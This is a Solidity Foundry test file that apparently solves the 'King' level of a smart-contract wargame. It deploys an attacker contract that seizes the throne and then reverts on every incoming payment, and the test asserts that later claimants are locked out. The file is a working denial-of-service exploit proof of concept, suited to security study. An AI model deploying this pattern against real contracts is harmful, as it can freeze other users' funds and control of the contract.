// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {King} from "../src/9.King.sol";

string constant hackRevert = "HaHaHa";
contract Hack {
  bool startHack;
  function hack(address payable king) external payable {
     king.call{value:msg.value}("");
     startHack = true;
  }

  receive() external payable {
    console.log("hack receiver", startHack);
    if(startHack){
      revert(hackRevert);
    }
  }
}



contract KingHackTest is Test {
   address payable king;
 
   address payable hackContract;

   address alice = vm.addr(1);
   address bob = vm.addr(2);
   address user = vm.addr(3);

   
   function setUp() public {
      alice.call{value:100}("");
      bob.call{value:200}("");
      user.call{value:9999}("");
      vm.prank(address(0));
      king = payable(address(new King()));
   }
   function hack() external payable {
      hackContract = payable(address(new Hack()));
      Hack(hackContract).hack{value: msg.value}(king);
   }

   function testKingHack() public {
    
      vm.prank(alice);
      king.call{value:100}("");
      assertEq(address(0).balance, 100);
      assertEq(King(king)._king(), alice);
     
      vm.prank(bob);
      king.call{value:200}("");
      assertEq(alice.balance, 200);
      assertEq(King(king)._king(), bob);

      // startHack
      this.hack{value:300}();
      assertEq(bob.balance, 300);
      assertEq(King(king)._king(), hackContract);

      vm.prank(user);
      (bool success,bytes memory res) = king.call{value:400}("");
      assertEq(success, false);
      console.log(string(res));
   }
}